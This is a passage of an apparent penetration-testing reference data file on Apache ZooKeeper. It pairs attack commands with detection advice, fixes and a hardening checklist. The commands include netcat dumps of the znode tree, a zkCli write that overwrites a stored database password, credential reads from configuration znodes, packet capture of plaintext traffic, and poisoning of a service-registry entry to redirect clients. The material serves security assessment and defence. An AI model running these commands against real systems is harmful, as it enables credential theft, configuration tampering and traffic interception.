          "The metrics output includes the size of the snapshot, the number of znodes, the average request latency and the quorum size, which tells you how big the state is and how many nodes hold it.",
      },
    ],
    attacks: [
      {
        title: "Unauthenticated read of znode data",
        severity: "critical",
        command: "printf 'dump' | nc -nv <target> 2181",
        detail:
          "The default permission is world:anyone with full access, so the configuration znodes are readable by anyone on the network. In most deployments they hold database URLs with passwords, cloud access keys and the location of key material.",
        detection:
          "Connections to the client port from hosts that are not application servers, and four-letter commands arriving from a source outside the cluster network.",
        fix:
          "Set an explicit permission on every znode, enable SASL or digest authentication, and disable the four-letter commands you do not need.",
      },
      {
        title: "Write access to configuration znodes",
        severity: "critical",
        command: "zkCli.sh -server <target>:2181 set /config/db.password 'pwned'",
        detail:
          "Write permission on the configuration tree lets an attacker change a credential, redirect a service to a host they control, or alter the quorum settings. The applications watching those znodes pick the change up on the next watch notification.",
        detection:
          "Znode update events with no corresponding change in the deployment pipeline, and clients reconnecting to an unexpected address.",
        fix:
          "Apply restrictive permissions, separate the read and write paths, and use the audit trail to review every set operation.",
      },
      {
        title: "Plaintext client traffic",
        severity: "medium",
        command: "sudo tcpdump -i eth0 -A -s0 'tcp port 2181 and host <ip>'",
        detail:
          "Without TLS the client traffic, including the znode data the applications read and write, crosses the network in clear. A passive capture of the connection to the ensemble is a direct read of everything the platform stores.",
        detection:
          "Traffic on 2181 outside the cluster network, or any connection to the port that has no TLS handshake.",
        fix:
          "Enable the secure client port with X509, keep the clear port on loopback only, and confine the ensemble to a private network.",
      },
    ],
    postEx: [
      {
        title: "Read the application configuration",
        severity: "critical",
        command: "zkCli.sh -server <target>:2181 get /config",
        detail:
          "The get command prints the data of a znode. Reading the application's configuration paths gives the connection strings and the credentials that the platform uses.",
        detection:
          "Reads of configuration znodes from a host that is not one of the registered application servers.",
        fix:
          "Keep sensitive values out of ZooKeeper where the platform allows it, and restrict the read permission on the configuration paths to the workloads that need them.",
      },
      {
        title: "Poison a service registry entry",
        severity: "critical",
        command: "zkCli.sh -server <target>:2181 create /services/payment -e -d 'https://<ip>'",
        detail:
          "Service discovery clients watch for new ephemeral nodes. Creating one with your own address makes every client connect to you, which is a clean interception point without touching any of the real services.",
        detection:
          "New ephemeral nodes in the registry that have no matching deployment, and clients connecting to an unexpected address.",
        fix:
          "Restrict who may create nodes in the registry, require the client to validate the advertised endpoint against a known list, and log every creation.",
      },
      {
        title: "List the clients attached to the ensemble",
        severity: "medium",
        command: "printf 'cons' | nc -nv <target> 2181",
        detail:
          "The cons output lists the client connections with their source addresses, which identifies the application servers and gives you the next set of targets.",
        detection:
          "Client connections from addresses that are not known application servers, particularly from the management network.",
        fix:
          "Restrict the client port to the application tier and alert on connections from anywhere else.",
      },
    ],
    commands: [
      { command: "ruok", description: "Health check, answered with imok." },
      { command: "stat", description: "Server state, version and connection counters." },
      { command: "srvr", description: "Server statistics." },
      { command: "conf", description: "Configuration, ports and authentication provider." },
      { command: "dump", description: "Session table and the znode tree with data." },
      { command: "envi", description: "The server environment." },
      { command: "mntr", description: "Metrics including latency and znode count." },
      { command: "cons", description: "Client connections and their source addresses." },
      { command: "isro", description: "Whether this node is read-only." },
      { command: "wchs", description: "Registered watches." },
    ],
    hardening: [
      {
        title: "Enable authentication",
        detail:
          "Turn on SASL with digest or Kerberos and require it from the client side. An unauthenticated ensemble is an open configuration store.",
      },
      {
        title: "Set explicit permissions on every znode",
        detail:
          "Replace the default world:anyone permission with a read-only grant for the consumers and a create and delete grant for the owners. Review the whole tree on a schedule.",
      },
      {
        title: "Whitelist the four-letter commands",
        detail:
          "Set the four-letter command whitelist so that only the handful you use are answered. Everything else returns an error instead of the server's internals.",
      },
      {
        title: "Use TLS on the client port",
        detail:
          "Enable the secure client port with certificate authentication, keep the clear port bound to loopback and require the encrypted port in the client configuration.",
      },
      {
        title: "Confine the ensemble to a private network",
        detail:
          "Keep the quorum ports and the client port on an internal network with an ACL that permits only the application tier and the operators.",
      },
      {
        title: "Patch it and run it unprivileged",
        detail:
          "Keep the release current and give the service account no write access beyond its own data directory. The snapshot files are as sensitive as the data they hold.",
      },
    ],
    tools: ["nmap", "netcat", "httpx", "socat"],
  },
];
